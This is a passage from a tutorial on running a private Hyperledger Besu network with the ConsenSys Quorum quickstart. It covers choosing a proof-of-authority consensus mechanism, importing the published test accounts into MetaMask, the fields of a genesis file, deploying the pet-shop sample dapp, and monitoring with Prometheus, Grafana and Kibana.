guitars that are being built. The transactions will represent different woods and provide information on their sourcing If a single node were run, if it were to go offline, it would only impact the guitar builder. Because immediate finality is not required, there is the potential of only needing a single validator at the start, it would be possible to use a Clique PoA network. If the suppliers wanted to join the network, they could all do so, and if one of them left the network, there would not be an impact to running the blockchain. Casinos A group of six casinos decide to create a sportsbook together, in order to share in winnings and decrease the individual exposure of each casino. Each casino will run a validator node and transactions will be the bets that bettors place on basketball games. As the games being bet on have a specific start time, bets must be included in the blockchain to receive a payout. If bets are not included, the payout is not able to be made to the bettor. Looking at this use case, we see the following: There are at least six participants at start, and therefore we assume there will be six validators The bets that are made have to be included in a block. Immediate finality is required If a certain number of casinos go offline, we may have to question whether to take bets or not, since the other casinos become more exposed to the betting positions. There should be a high volume of transactions allowed, as the scenario of the number of placed bets is likely to increase the closer a basketball game approaches the start time. Because immediate finality is required, we are drawn to using an IBFT 2.0 PoA network. If we were to do this, then we would need at least 4 validators. Since there are six casinos participating, we can use an IBFT 2.0 PoA network. If more than two casinos were to leave then the network would no longer be able to run. In terms of liveness, the network can withstand a validator going offline (due to a power outage or other reason), and continue to operate, which is very important for the overall success of the sports book. Determining the PoA Consensus Mechanism to Use in Your Network Based on these examples, here are questions to ask yourself, which can help you determine which PoA consensus mechanism may make more sense. What are my finality requirements? Does my use case require that each block created instantly be confirmed? If a block is not instantly confirmed, what are the potential impacts? How many validators do I intend my network to have? How many will I have at the start? How many could be added to the network over time? Do I think validators could leave my network? Would I stop running the network if a certain number of validators left? Do I need participants to join the network without being validators? Should they be able to submit transactions? What fault tolerance does my network require? Does the number of validators that will participate at start allow for the network to continue running if one goes down? What happens if two or more validators go down? How fast do I need to be able to create new blocks? Will the speed at which I need to create new blocks stay constant or can it slow down if new validators are added? These questions can serve as a guide in thinking which PoA consensus mechanism makes sense for your use case. Part 3: Set up MetaMask Now that we have the network up and running, we are going to set up our MetaMask wallet. If you already have MetaMask installed, you can skip this step. If not, follow the links below. First, download the MetaMask browser extension. If you want to explore the features of MetaMask, this article can help you walk through how to send your first transaction using MetaMask. Follow the instructions to set up your MetaMask account. For the purposes of this guide, the accounts we will be using will not have mainnet Ether. Still get in the habit of the following: - Copy down your seed phrase and store it in a secure location. - Do not share your seed phrase with anyone - Ensure that you can use your seed phrase to recover your account MetaMask is a self-custodial wallet, so if you lose the seed phrase associated with it, you have lost access to that Ethereum account. If you give that seed phrase to someone, they now have control over that account. Open up your MetaMask account and navigate to to the top of the browser extension click on the Ethereum Mainnet menu. From the drop down select Localhost 8545. This is where the blockchain that we spun up with the quickstart is running. If you want to learn more about connecting to different networks, this documentation from MetaMask will give you more insight on how it works. MetaMask will allow us to send transactions between Ethereum accounts on our network, which we will call Externally Owned Accounts (EOA). When we ran the quickstart, the private blockchain network that we created was initialized with three accounts pre-loaded with test Ether. Looking into the quorum-test-network folder, you will see a structure within the config -> besu folder that shows the three member folders. In each folder is a keys folder, which has a file called key, which is the private key and key.pub, which is the public key. We will open the file named \u201ckey\u201d in member1 to see what is inside Here we see the private key, without the 0x prefix. The private key for this address would be 0x8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63 To import this address into our MetaMask, we will click the circle in the upper right corner of the MetaMask extension. This circle is called a favicon by the MetaMask team: We will hit the Import Account button: And will copy paste the private key, repeated below: 0x8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63 Into the following field This will create our account, which is pre-loaded with 200 test Ether: Below you can find information about the pre-loaded accounts:, in the event you want to import them: Test Account 1 (address 0xfe3b557e8fb62b89f4916b721be55ceb828dbd73) Private key to copy : 0x8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63 Initial balance : 200 Eth (200000000000000000000 Wei) Test Account 2 (address 0x627306090abaB3A6e1400e9345bC60c78a8BEf57) Private key to copy : 0xc87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3 Initial balance : 90000 Eth (90000000000000000000000 Wei) Test Account 3 (address 0xf17f52151EbEF6C7334FAD080c5704D77216b732) Private key to copy : 0xae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f Initial balance : 90000 Eth (90000000000000000000000 Wei) If we import these accounts and send 7 ETH from Test Account 1 to Test Account 2: we can see within the block explorer (accessible in our browser at http://localhost:25000/), Account 1 will decrement by 7 ETH: And that Account 2 will increase by just under 7 ETH Why didn\u2019t Account 2 increase by 7 ETH? In this specific example, we have paid a transaction cost to send the Ether from one account to another. The transaction cost is called the gas, and is sometimes also called the gas fee. It is paid in increments of Ether called Wei, which is a fractional amount of ETH (1 Wei is 10^-18 ETH). There is a 21000 wei cost we pay to send Ether, and that is deducted from the transaction, which was the gas limit (the upper amount of gas we are willing to pay) stipulated for this transaction on MetaMask. The private network we have created is a gas-less network, so there is no need to pay that fee, and we could reduce the gas limit to 0 and the transaction would go through. Understanding gas is critical for understanding how mainnet Ethereum works, as well as how it may be useful in other private networks we create, but for now, you can read a brief overview about gas here to better understand this concept. How were these accounts created? When we ran ./run.sh in our terminal, this script told docker-compose to run a .yml file, which contained information about the accounts, keys, and initialization information for our network in a genesis file. This genesis file - which is a .json file, provided our blockchain with information about the accounts, including the address and the amount of Ether they held. To see a genesis file in the quickstart, you can open and look at cliqueGenesis.json, which is in the quorum-test-network -> config -> besu directory. It looks like the following: { \"config\":{ \"chainId\":1337, \"constantinoplefixblock\": 0, \"clique\":{ \"blockperiodseconds\":15, \"epochlength\":30000 } }, \"coinbase\":\"0x0000000000000000000000000000000000000000\", \"difficulty\":\"0x1\", \"extraData\":\"0x00000000000000000000000000000000000000000000000000000000000000004592c8e45706cc08b8f44b11e43cba0cfc5892cb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\", \"gasLimit\":\"0xa00000\", \"mixHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\", \"nonce\":\"0x0\", \"timestamp\":\"0x5c51a607\", \"alloc\": { \"fe3b557e8fb62b89f4916b721be55ceb828dbd73\": { \"privateKey\": \"8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"0xad78ebc5ac6200000\" }, \"627306090abaB3A6e1400e9345bC60c78a8BEf57\": { \"privateKey\": \"c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" }, \"f17f52151EbEF6C7334FAD080c5704D77216b732\": { \"privateKey\": \"ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" } }, \"number\":\"0x0\", \"gasUsed\":\"0x0\", \"parentHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\" } Within this file, I have highlighted the accounts that were created and the balances they were created with (the balances are in wei, not Ether. Remember 1 wei is 10 x -18 Ether). The quickstart and the scripts we run take care of creating these accounts, but we are able to create our own network where we can initialize accounts and configure our network to be customized to our particular use case. Understanding a Genesis File: The Basics Setting up a private network or joining a public network requires an Ethereum node to create a new blockchain. Whether it is a private or public network, each node / validator will have a full copy of the blockchain. In order to build this copy, the node / validator has to have instructions on how to build the first block and the subsequent blocks in the chain. In this article, we are going to walk through the components of a genesis file, within the context of the Ethereum client Hyperledger Besu as the client for our network. These concepts are applicable to all Ethereum clients. The first block in a blockchain is called the genesis block. Ethereum mainnet\u2019s genesis block - block 0 - was mined on July 30, 2015. In order to join or create any network, the data for the genesis block must be included. Therefore, the genesis file defines the data that is in the first block of a blockchain, as well as rules for the blockchain itself. If a new node or validator attempts to join the blockchain, it will use the genesis file as the starting point in recreating the history of the chain in order to synchronize with the existing network. The genesis file for Ethereum mainnet, along with the supported testnets, is included in the download of Besu. When creating a private network, a custom genesis file must be provided. The genesis file is a JSON formatted file. It looks like the below: { \"config\": { \"chainId\": 2018, \"muirglacierblock\": 0, \"ibft2\": { \"blockperiodseconds\": 2, \"epochlength\": 30000, \"requesttimeoutseconds\": 4 } }, \"nonce\": \"0x0\", \"timestamp\": \"0x58ee40ba\", \"extraData\": \"0xf83ea00000000000000000000000000000000000000000000000000000000000000000d5949811ebc35d7b06b3fa8dc5809a1f9c52751e1deb808400000000c0\", \"gasLimit\": \"0x1fffffffffffff\", \"difficulty\": \"0x1\", \"mixHash\": \"0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365\", \"coinbase\": \"0x0000000000000000000000000000000000000000\", \"alloc\": { \"9811ebc35d7b06b3fa8dc5809a1f9c52751e1deb\": { \"balance\": \"0xad78ebc5ac6200000\" } } } In this specific example, the genesis file is for an IBFT 2.0 private network. { \"config\": { \"chainId\": 2018, \"muirglacierblock\": 0, \"ibft2\": { \"blockperiodseconds\": 2, \"epochlength\": 30000, \"requesttimeoutseconds\": 4 } The config key section contains the following information about the blockchain \u201cchainId\u201d: 2018 The chainId controls the transaction signature process, providing a unique identifier to allow for the hashing of signed transactions to only work on the network associated with the corresponding chainId. Ethereum Improvement Proposal 155 (EIP-155) provides more information on the relationale behind the chainID. Most chainIDs match the networkID of the network. In this case, 2018 refers to the chainID associated with a development chain. For a list of the network and chain IDs, please see the Documentation. \"muirglacierblock\": 0, This field is called a \u201cmilestone block\u201d. Muir glacier refers to a specific network upgrade that occurred at block 9,200,000 on Ethereum mainnet. For private networks, like the one that is being created in this example, the name of the latest milestone block can be listed, and set to be the genesis block. Here you can see a continuously updated list of network upgrades and the associated blocks for Ethereum. \u201cibft2\u201d: This specifies that the consensus protocol for the blockchain is IBFT 2.0. The options available for specifying the consensus mechanism are available in the documentation, with an overview of the proof-of-authority (PoA) consensus protocols available here. Within the specification, the following three fields are provided: \"blockperiodseconds\": 2, The minimum block time, in seconds. In this case, after two seconds, a new block will be proposed by the network with transactions stored in the memory pool packaged and distributed to the network. \"epochlength\": 30000, The number of blocks at which to reset all votes. The votes refer to validators voting to add or remove validators to the network. In this case, after 30,000 blocks are created, this IBFT 2.0 network will discard all pending votes collected from received blocks. Existing proposals remain in effect and validators re-add their vote the next time they create a block. \"requesttimeoutseconds\": 4 The time by which a new block must be proposed or else a new validator will be assigned by the network. If a validator goes down, the request time out ensures that the proposal of a new block passes on to another validator. The request time out seconds should be set to be double the minimum block time (blockperiodseconds), hence why it is 4. The second section, starting with \"nonce\": \"0x0\", contains information about the genesis block \"nonce\": \"0x0\", \"timestamp\": \"0x58ee40ba\", \"extraData\": \"0xf83ea00000000000000000000000000000000000000000000000000000000000000000d5949811ebc35d7b06b3fa8dc5809a1f9c52751e1deb808400000000c0\", \"gasLimit\": \"0x1fffffffffffff\", \"difficulty\": \"0x1\", \"mixHash\": \"0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365\", \"coinbase\": \"0x0000000000000000000000000000000000000000\", \"alloc\": { \"9811ebc35d7b06b3fa8dc5809a1f9c52751e1deb\": { \"balance\": \"0xad78ebc5ac6200000\" } } } \"nonce\": \"0x0\", The number used once aka nonce, that is a part of the blockheader for the first block. Set to 0x0. \"timestamp\": \"0x58ee40ba\", The creation date and time of the block. Often it can be set to 0x0, but as long as it is any value in the past, it will work. In this case 0x58ee40ba is a hexadecimal which converts to 1492009146 and represents Wed Apr 12 2017 14:59:06 GMT+0000 \"extraData\": \"0xf83ea00000000000000000000000000000000000000000000000000000000000000000d5949811ebc35d7b06b3fa8dc5809a1f9c52751e1deb808400000000c0\", Extra data is a recursive length prefix (RLP) encoded string (which is space efficient) containing the validator addresses of the IBFT 2.0 private network. The validator addresses are unique to the validators, so if there are four validators are the start of the network, this field should contain a list of their addresses.. Instructions on how to create an RLP using Besu can be found here. \"gasLimit\": \"0x1fffffffffffff\", The block gas limit, which is the total gas limit for all transactions included in a block. It defines how large the block size can be for the block, and is represented by an hexadecimal string. For this network, the gas limit is the maximum size, and is therefore a \u201cfree gas network\u201d \"difficulty\": \"0x1\", The difficulty of creating a new block. Represented as a hexadecimal string, the difficulty is set to 1, effectively the lowest difficulty. \"mixHash\": \"0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365\", The mixHash is the unique identifier for the block, which for this genesis file is 0x63746963616c2062797a616e74696e65206661756c7420746f6c6572616e6365 \"coinbase\": \"0x0000000000000000000000000000000000000000\", The network coinbase account, which is where all block rewards for this network will be paid. In this case it is to 0x0000000000000000000000000000000000000000, which is sometimes called address(0) or the zero address. \"alloc\": { \"9811ebc35d7b06b3fa8dc5809a1f9c52751e1deb\": { \"balance\": \"0xad78ebc5ac6200000\" The alloc field creates an address on our network, which is sometimes also referred to as an externally owned account, as it is an account not associated with a smart contract (referred to as a contract account). The number starting with \u201c98\u201d is the public key of the address. The balance can be passed in as a decimal OR a hexadecimal (like it has in this case and corresponds to 200 ETH, or 2*10^20 Wei). The balance is always in Wei, or 10^-18 Ether. A Second Genesis File Below we provide another genesis file with a different consensus mechanism, Clique PoA, and different information. Take a look below and see what values stick out. This is the genesis file for the chain that you can build in the ConsenSys Quorum quickstart: { \"config\":{ \"chainId\":1337, \"muirglacierblock\": 0, \"clique\":{ \"blockperiodseconds\":15, \"epochlength\":30000 } }, \"coinbase\":\"0x0000000000000000000000000000000000000000\", \"difficulty\":\"0x1\", \"extraData\":\"0x00000000000000000000000000000000000000000000000000000000000000004592c8e45706cc08b8f44b11e43cba0cfc5892cb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\", \"gasLimit\":\"0xa00000\", \"mixHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\", \"nonce\":\"0x0\", \"timestamp\":\"0x5c51a607\", \"alloc\": { \"fe3b557e8fb62b89f4916b721be55ceb828dbd73\": { \"privateKey\": \"8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"0xad78ebc5ac6200000\" }, \"627306090abaB3A6e1400e9345bC60c78a8BEf57\": { \"privateKey\": \"c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" }, \"f17f52151EbEF6C7334FAD080c5704D77216b732\": { \"privateKey\": \"ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" } }, \"number\":\"0x0\", \"gasUsed\":\"0x0\", \"parentHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\" } Once again, we will look at the fields and explain them. { \"config\":{ \"chainId\":1337, \"constantinoplefixblock\": 0, \"clique\":{ \"blockperiodseconds\":15, \"epochlength\":30000 } } The config key section contains the following information about the blockchain \u201cchainId\u201d: 1337 In this case. 1337 refers to a local chainID. MetaMask, a self-custodial wallet, and Ganache, which is Truffle\u2019s Private Blockchain App, both use this as the local chain ID, and so to follow convention, in this genesis file we are doing the same. For a list of the network and chain IDs, please see the Documentation. \"muirglacierblock\": 0, Once again, we have set the milestone block to Muir Glacier. Something to note - The \u201cmilestone block\u201d could be for this configuration file, which is something you may see in some tutorials. For example, if we saw constantinopleBlock\": 0, this refers to a specific network upgrade that occurred at block 7,280,000 on Ethereum mainnet. For private networks, like the one that is being created in this example, the name of the latest milestone block can be listed, and set to be the genesis block. Here you can see a continuously updated list of network upgrades and the associated blocks for Ethereum. \u201cclique\u201d: This specifies that the consensus protocol for the blockchain is Clique. The options available for specifying the consensus mechanism are available in the documentation, with an overview of the proof-of-authority (PoA) consensus protocols available here. Within the specification, the following two fields are provided: \"blockperiodseconds\": 15, The minimum block time, in seconds. In this case, after 15 seconds, a new block will be proposed by the network. Given this genesis file is modeled after the testnet, it is made to approximate the minimum blocktime of mainnet, which is 15 seconds. \"epochlength\": 30000, The number of blocks at which to reset all votes. The votes refer to validators voting to add or remove validators to the network. In this case, after 30,000 blocks are created, this Clique network will discard all pending votes collected from received blocks. Existing proposals remain in effect and validators re-add their vote the next time they create a block. Starting at the coinbase we now have the information available in the genesis block \"coinbase\":\"0x0000000000000000000000000000000000000000\", \"difficulty\":\"0x1\", \"extraData\":\"0x00000000000000000000000000000000000000000000000000000000000000004592c8e45706cc08b8f44b11e43cba0cfc5892cb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\", \"gasLimit\":\"0xa00000\", \"mixHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\", \"nonce\":\"0x0\", \"timestamp\":\"0x5c51a607\", \"alloc\": { \"fe3b557e8fb62b89f4916b721be55ceb828dbd73\": { \"privateKey\": \"8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"0xad78ebc5ac6200000\" }, \"627306090abaB3A6e1400e9345bC60c78a8BEf57\": { \"privateKey\": \"c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" }, \"f17f52151EbEF6C7334FAD080c5704D77216b732\": { \"privateKey\": \"ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" } } \"coinbase\": \"0x0000000000000000000000000000000000000000\", The coinbase account, which is where all block rewards for this network will be paid. In this case it is to 0x0000000000000000000000000000000000000000, which is sometimes called address(0) or the zero address. \"difficulty\": \"0x1\", The difficulty of creating a new block. Represented as a hexadecimal string, the difficulty is set to 1, effectively the lowest difficulty. \"extraData\":\"0x00000000000000000000000000000000000000000000000000000000000000004592c8e45706cc08b8f44b11e43cba0cfc5892cb0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\", Extra data is a recursive length prefix (RLP) encoded string (which is space efficient) containing the validator address of the Clique private network, which in this case is 4592c8e45706cc08b8f44b11e43cba0cfc5892cb. Instructions on how to create an RLP using Besu can be found here and how to add additional addresses for a Clique network with additional signers can be found here. \"gasLimit\": \"0xa00000\", The block gas limit, which is the total gas limit for all transactions included in a block. It defines how large the block size can be for the block, and is represented by an hexadecimal string. For this network, the gas limit is \"mixHash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\", The mixHash is the unique identifier for the block, which for this genesis file is 0x0000000000000000000000000000000000000000000000000000000000000000 \"nonce\": \"0x0\", \"timestamp\": \"0x5c51a607\", In this case 0x5c51a607 is a hexadecimal which converts to 1548854791 and represents Wed Jan 30 2019 13:26:31 GMT+0000. \"alloc\": { \"fe3b557e8fb62b89f4916b721be55ceb828dbd73\": { \"privateKey\": \"8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"0xad78ebc5ac6200000\" }, \"627306090abaB3A6e1400e9345bC60c78a8BEf57\": { \"privateKey\": \"c87509a1c067bbde78beb793e6fa76530b6382a4c0241e5e4a9ec0a0f44dc0d3\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" }, \"f17f52151EbEF6C7334FAD080c5704D77216b732\": { \"privateKey\": \"ae6ae8e5ccbfb04590405997ee2d52d2b330726137b875053c36d94e974d162f\", \"comment\": \"private key and this comment are ignored. In a real chain, the private key should NOT be stored\", \"balance\": \"90000000000000000000000\" } The alloc field creates three addresses on our network, The balance can be passed in as a decimal (like the second and third account, which are both 900 ETH, or 2 10^20 Wei) OR a hexadecimal (like the first account, which is 200 ETH, or 2 10^20 Wei). The balance is always in Wei, or 10^-18 Ether. Deploying Your Genesis File Once you have created your genesis file, you will save it within the directory where your blockchain networks files will be kept. Do not save it within any of the Node or data folders, but rather at the top level. When it is time to start your network, you will use the flag --genesis-file=../genesis.json To start up your network using the genesis file use the following command: besu --genesis-file=../genesis.json For more information, please see the Documentation. Part 4: Deploy the Pet Shop Decentralized Application within the dapps folder of the quorum-test-network directory We are now going to deploy a decentralized application (dapp) to our private network. From your terminal, change directory to the folder dapps, and then into pet-shop cd dapps/pet-shop/ Within this directory, you will find a file called custom_config and a script called run_dapp.sh run_dapp.sh looks like the following: !/bin/bash set -e hash truffle 2>/dev/null || { echo >&2 \"This script requires truffle but it's not installed.\" echo >&2 \"Refer to documentation to fulfill requirements.\" exit 1 } rm -rf pet-shop-box git clone https://github.com/truffle-box/pet-shop-box.git cp -r custom_config/* ./pet-shop-box/ cd pet-shop-box/ npm install npm install truffle npm install @truffle/hdwallet-provider truffle compile truffle migrate --network quickstartWallet truffle test --network quickstartWallet docker build . -t quorum-dev-quickstart_pet_shop docker run -p 3001:3001 --name quorum-dev-quickstart_pet_shop --detach quorum-dev-quickstart_pet_shop This script is going to download from GitHub a Truffle box, which are pre-built dapps or templates for building your own dapp. In this case, the pet-shop dapp contains a smart contract called Adoption.sol, a front-end for this dapp written in react, which is a javascript library specifically for building front-ends and user interfaces, and the necessary dependencies needed to deploy the smart contract to an Ethereum network. The script is going to install truffle which is required in order to run commands using truffle, like truffle migrate. Truffle migrate is a command which specifically compiles our smart contract (Adoption.sol) into EVM bytecode and deploys it to the private network we have created. The script also downloads hdwallet-provider, which is used to create Ethereum accounts that we can use to interact with our decentralized application, and to send transactions on the private network we have created. The Ethereum accounts we have created will be imported into MetaMask. If you want to familiarize yourself with Truffle, you can walk through a tutorial here. For our current tutorial, we are using the private network created by the quorum quickstart as our local test blockchain network. Within the folder custom_config, we have our Smart Contract - Adoption.sol Adoption.sol is a simple smart contract written in solidity. It looks like this: pragma solidity ^0.5.0; contract Adoption { address[16] public adopters; // Adopting a pet function adopt(uint petId) public returns (uint) { require(petId >= 0 && petId <= 15); adopters[petId] = msg.sender; return petId; } // Retrieving the adopters function getAdopters() public view returns (address[16] memory) { return adopters; } } A detailed description of this smart contract, along with a tutorial to build it can be found on the Truffle website. We are going to give you a quick overview of the contract in order to contextualize what happens once it is deployed to our private blockchain. Let us take a look at the smart contract to better understand what it does: pragma solidity ^0.5.0; This first line of code tells us the smart contract is written for Solidity version 0.5.0 or higher, and will be compatible with 0.5.0 and higher. contract Adoption { address[16] public adopters; These two lines of code do the following: contract Adoption { declares an object of type contract. If you want to learn more about this object type, the Solidity documentation has a nice explanation of a Contract object. In this example, anything after the { (the brackets) will define the contract object - what it can do and what it can store on the blockchain. address[16] public adopters; instantiates 16 addresses in an array which we have given the variable name \u201cadopters\u201d. These addresses are public, which means they can be accessed from outside of this contract as well as inside the contract. // Adopting a pet function adopt(uint petId) public returns (uint) { require(petId >= 0 && petId <= 15); adopters[petId] = msg.sender; return petId; } The first line is a comment, which will not be compiled but gives us information that the following function is for adopting a pet. The function, adopt, takes in a unsigned integer called petID, and checks if it is between 0 and 15. If it is, then the address at the location of the the petID within the adopters array is assigned to the account that called the adopt function (adopters[petID] = msg.sender is the specific code). Then the petID is returned. The second function: // Retrieving the adopters function getAdopters() public view returns (address[16] memory) { return adopters; } returns the array of addresses of the adopters. Now that we understand the smart contract,we run the command ./run_dapp.sh in the terminal within the pet-shop folder (which we should have already navigated into if you have been following along with each step). This is going to download all the dependencies, as well as compile and migrate our smart contract to the private network we have created using the Quorum quickstart, and spin up a front end that will allow us to \u201cadopt\u201d some group of 16 pets. When you run it, there will be many downloads. You know that the script has successfully run when you reach the following: Here we can see that Truffle has deployed the Migrationsmart contract and has now deployed it to the Hyperledger Besu based blockchain network we have spun up. If we take the contract address: 0x345cA3e014Aaf5dcA488057592ee47305D9B3e10 that is listed here and navigate in a web browser to the block explorer (go to your browser and type in: http://localhost:25000/, then paste in the contract address: 0x345cA3e014Aaf5dcA488057592ee47305D9B3e10 We will see the following information about our deployed smart contract: We can also use the block explorer to look up other information, like the externally owned account (in the >account field, which for our specific example is: 0x627306090abaB3A6e1400e9345bC60c78a8BEf57) We are able to see the ETH balance for that account. The ETH used in this example is not mainnet ETH, and it is only used for testing purposes. From this step, we hope that you can see how you can use the quickstart to deploy a decentralized application. Thus, the quickstart provides you with a template of being able to test a decentralized application of your own that you build. Let\u2019s look at the dapp by going to our browser and typing in http://localhost:3001. We will arrive at the following screen, and MetaMask, which we installed in Part 3, will pop up for us and ask which account we want to connect to the application. Hitting adopt will prompt MetaMask to pop-up and adopt the pet: Since this is a gasless network, there is no fee associated with adopting a pet. Issues you may encounter and how to solve them When you run /.run_dapp.sh you may get the following error: The Error: Deployment Failed \u201cMigrations\u201d --Wrong chainId means that within the deployment.js file, the chainID (which chain you are deploying to) was incorrectly specified. If that is the case, you should run the npx quorum-dev-quickstart again, as this means you are on an older version of the quickstart that does not have the most up to date versions of truffle and hd-wallet provider. Specifically, you need to be on 1.4.0 and above of hd-wallet provider. Versions 1.3.0 and 1.3.1 will not work work with the quickstart (though users will see that version 1.2.6 will still work with the quickstart). Make sure you are on version 0.0.21 of the quickstart or higher to avoid this issue. If there is no UI that appears at localhost:3001 after running the script ./run_dapp.sh, navigate to the pet-shop-box folder: cd pet-shop-box amd use the command npm run dev to start up the front end in our browser. If this runs successfully, we will get the following output in the terminal: Then you can navigate to the URLs listed in the output to see your application. Part 5: Use the monitoring tools used in the quickstart There are monitoring tools included in the quickstart, which allow us to learn about how our private blockchain network is working. In part 4, we use the block explorer to look at the contract address of the deployed smart contract and the externally owned account that was responsible for deploying the smart contract to our network. Now we are going to explore two additional tools we can use to monitor our private network. The first is Prometheus - an open source monitoring tool that pulls data from the services that it is connected to - like nodes, databases, validators, servers, etc - and allows for that data from these services to be use in alerts and notifications. For example, if the memory usage of a certain node on your network exceeds a defined threshold, Prometheus is able to track this and alert you so you can take the appropriate action to ensure your network continues to run properly. In the case of a failure, Prometheus provides the data from the various services to allow for troubleshooting the issue. Prometheus pulls the data and stores it in a database, and then allows you or a data visualization tool to query that data. When you install and run the quickstart, you will get access to Prometheus at http://localhost:9090/graph. If you enter this address into a web browser, you will see the following: What exactly is Prometheus monitoring? To see the details, you can navigate to the config folder within your quorum-test-network directory. Opening the prometheus folder will reveal a prometheus.yml file. If you open that with a text editor (like Visual Studio Code or Vim) you will see that Prometheus is configured by the quickstart to scrape data from each validator, the rpcnode, and each member of the network every 15 seconds, and to store that data in the /metrics pathway, so that you can query it. Below is a screenshot of the first 28 of the total 129 lines of the prometheus.yml file The metrics we have access to can be seen by navigating and clicking on the curricular icon next to the Execute button in the right upper side of the screen. This will reveal the list of metrics that you can query Promtheus to return data for: If we choose ethereum_peer_count, it will return the number of peers on the network, which for this example is seven If we type in the following query into the search bar (the part of the user interface with \u201cExpression (press Shift+Enter for newlines) besu_blockchain_difficulty_total We will get back the following a result of our query that will look similar to the the below screenshot: This query is asking Prometheus to return data on the total difficulty for each participant node in our network. Prometheus has an integration with Granfana - an observability platform that takes in data - in this case from our private blockchain via Prometheus - and displays the outputs as visualizations. This allows us to make sense of what is occurring in our private network over time. The quickstart manages the connection of the data from Prometheus to pre-built dashboards in Grafana. If you navigate to http://localhost:3000/d/XE4V0WGZz/besu-overview?orgId=1&refresh=10s&from=now-30m&to=now&var-system=All, the metrics from Prometheus will be displayed in a Grafana dashboard, providing us with the metrics in tabular and graphical format. This format makes exploring the data retrieved from Prometheus easier, and allows us to explore many metrics simultaneously. Logs are available via Elasticsearch, Logstash, and Kibana (ELK). ELK allows us to take in process, search, transform, and display data. In the Quickstart, this is configured specifically to ingest the Besu logs. As a reminder, navigating to the terminal and running the script ./list.sh This script will show the various endpoints and services available in the quickstart Quorum Dev Quickstart Setting up the index patterns in kibana ... List endpoints and services JSON-RPC HTTP service endpoint : http://localhost:8545 JSON-RPC WebSocket service endpoint : ws://localhost:8546 Web block explorer address : http://localhost:25000/ Prometheus address : http://localhost:9090/graph Grafana address : http://localhost:3000/d/XE4V0WGZz/besu-overview?orgId=1&refresh=10s&from=now-30m&to=now&var-system=All Collated logs using Kibana endpoint : http://localhost:5601/app/kibana#/discover For more information on the endpoints and services, refer to README.md in the installation directory. Navigating to the Collated logs using Kibana endpoint using your browser http://localhost:5601/app/kibana#/discover This will pull up a Kibana dashboard The logs are pulled automatically by the setup of the Quickstart. For more information about configuring Kibana on your own, you can see an overview within the documentation. Part 6: Deploy a second Smart Contract to the network and send a private transaction Now we are going to take another smart contract and deploy it to our network. This will be a simple smart contract, and the goal of deploying it is to demonstrate the use of private transactions in the network.. This smart contract is already installed as part of the quickstart, and you can find it in the folder smart_contracts. Navigate to the smart_contracts folder using the command cd smart_contracts and you can look at that smart contract EventEmitter.sol: pragma solidity ^0.7.0; // compile with: // solc EventEmitter.sol --bin --abi --optimize --overwrite -o . // then create web3j wrappers with: // web3j solidity generate -b ./generated/EventEmitter.bin -a ./generated/EventEmitter.abi -o ../../../../../ -p org.hyperledger.besu.tests.web3j.generated contract EventEmitter { address owner; event stored(address _to, uint _amount); address _sender; uint _value; constructor () public { owner = msg . sender ; } function store ( uint _amount ) public { emit stored ( msg . sender , _amount ); _value = _amount ; _sender = msg . sender ; } function value () view public returns ( uint ) { return _value ; } function sender () view public returns ( address ) { return _sender ; } } Run the commands npm install node scripts/deploy.js which will deploy the EventEmitter.sol smart contract that is in the contracts folder and send a private transaction from Member1 to Member3 of the network. The private transaction, in this example, is the sending of a value from Member1 to Member3. If we look inside the deploy.js script, we will see that the value being sent from Member1 to Member3 is 47 (see line 89 within the deploy.js file) Alt Text: Private Transaction example output Looking at this output in the terminal, the following has occurred. 